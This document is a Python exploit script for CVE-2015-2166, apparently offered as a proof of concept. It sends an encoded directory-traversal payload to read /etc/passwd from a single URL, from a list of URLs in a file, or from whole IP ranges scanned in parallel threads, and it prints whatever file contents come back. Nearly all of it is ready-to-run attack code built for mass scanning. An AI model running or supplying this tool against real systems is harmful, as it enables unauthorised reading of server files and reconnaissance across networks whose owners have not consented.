#!/bin/python3

import time
import requests
import argparse
from colorama import init, Fore, Style
from datetime import datetime
from netaddr import IPNetwork
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

current_time = datetime.now().strftime("%H:%M:%S")

GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
WHITE = Fore.WHITE
MAGENTA = Fore.MAGENTA
NC = Style.RESET_ALL

exploit_payload = "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"

def check_vulnerability(url, verify_cert):
    full_url = url + exploit_payload
    try:
        response = requests.get(full_url, verify=verify_cert)
        if response.status_code == 200 or response.status_code == 302:
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{YELLOW}CHECKING{WHITE}] {GREEN}{url}")
            print("")
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{MAGENTA}VULNERABLE{WHITE}] {GREEN}{url}{MAGENTA}{exploit_payload}")
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{MAGENTA}EXPLOITING{WHITE}] {GREEN}{url}{MAGENTA}{exploit_payload}")
            print(f"{WHITE}")
            time.sleep(2)
            dump_data = response.text
            print(dump_data)
    except requests.exceptions.RequestException:
    	print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{RED}NOT-VULNERABLE{WHITE}] {GREEN}{url}")
    	pass

def scan_ip_range(ip_range, verify_cert):
    def scan_single_ip(ip):
        url = f"http://{ip}{exploit_payload}"
        try:
            send_get = requests.get(url, timeout=5, verify=False).status_code
            if send_get == 200 or send_get == 302:
                print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{MAGENTA}VULNERABLE{WHITE}] {GREEN}{url}{MAGENTA}{exploit_payload}")
        except requests.exceptions.RequestException:
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{RED}NOT-VULNERABLE{WHITE}] {GREEN}{url}")

    threads = []

    for ip in IPNetwork(ip_range):
        thread = threading.Thread(target=scan_single_ip, args=(ip,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def scan_urls_from_file(file_path, verify_cert):
    with open(file_path, "r") as file:
        urls = file.read().splitlines()
        for url in urls:
            check_vulnerability(url, verify_cert)

def main():
    parser = argparse.ArgumentParser(description="CVE-2015-2166 PoC (Proof of Concept)")
    parser.add_argument("url", nargs="?", help="The URL to check for vulnerability.")
    parser.add_argument("-f", "--file", help="Path to a file containing a list of URLs to scan.")
    parser.add_argument("--no-verify", action="store_false", dest="verify_cert", help="Disable SSL certificate verification.")
    parser.add_argument("--ip-range", action="store", help="Scan subnet IP subnet range for CVE-2015-2166")
    args = parser.parse_args()

    if args.file:
        scan_urls_from_file(args.file, args.verify_cert)
    elif args.ip_range:
        scan_ip_range(args.ip_range, args.verify_cert)
    else:
        check_vulnerability(args.url, args.verify_cert)

if __name__ == "__main__":
    main()
